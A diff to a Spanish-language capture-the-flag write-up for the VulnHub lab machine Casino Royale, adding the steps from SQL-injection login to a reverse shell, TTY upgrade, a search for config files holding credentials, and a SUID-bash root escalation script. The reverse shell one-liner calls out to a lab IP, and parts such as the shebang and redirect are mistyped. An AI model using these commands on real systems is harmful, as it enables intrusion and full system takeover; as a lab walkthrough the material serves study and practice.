@@ -66,7 +66,7 @@ searchsploit PokerMax
 Si usamos la URL que nos proporciona el exploit de `searchsploit` nos redirige a un panel de autenticación
 
 # EXPLOTACION
-### METODO 1 - SCRIPT PYTHON INSPIRADO DEL TITO S4VITAR
+## SCRIPT PYTHON DEL TITO S4VITAR - TAMBIEN SE PUEDE ENUMERAR MUCHO MAS RAPIDO CON SQLMAP
 Si probamos una Inyección Sql básica en el panel de autenticacion nos autentica pero vamos a analizar con BurpSuite la Traza
 ![sqli](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/sqli.png)
 
@@ -234,6 +234,51 @@ Ahora si manipulamos la URL con cmd  nos permite
 ![cmdurl](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/cmdurl.png)
 
 Procedemos con una Reverse Shell
+```shell
+bash -c "bash -i >%26 /dev/tcp/192.168.195.128/443 0>261"
+```
+![reverses](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/reverses.png)
+![nc](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/nc.png)
+
+Para poder operar mejor podemos hacer un tratamiento de la TTY para obtener una bash interactiva
+```ruby
+script /dev/null -c bash
+Ctrl + Z
+stty raw -echo; fg
+          reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+# ESCALADA DE PRIVILEGIOS
+Eh pasado un rato buscando y no eh encontrado una via potencial para escalar privilegios hasta que, pense que por el modelo de la infraestructura. como 
+habiamos visto un CMS tambien, buscar los archivos relacionados a config.php, wp-admin.php, etc
+
+```ruby
+find / name \*config\* 2>/dev/null 
+```
+![find](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/find.png)
+![passvvalenka](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/passvalenka.png)
+
+migramos de usuario con las credenciales de Valenka
+![migracion](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/migracionuser.png)
+
+Creamos un scrip dond le demos permisos SUID a la bash para ponernos como root
+```ruby
+!#/bin/bash
+chmod u+s /bin/bash
+
+bash -p
+```
+
+![scriptroot](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/scriptroot.png)
+
+Navegamos por el directorio flag y para obtener la flag nos pide montarse un server en PHP por un puerto determinado y luego ir a la web 
+
+![flag](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/flag.png)
+![flagfinal](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/casinoroyale%3A1/flagfinal.png)
+
+# HEMOS RESUELTO LA MAQUINA!
 
 
 
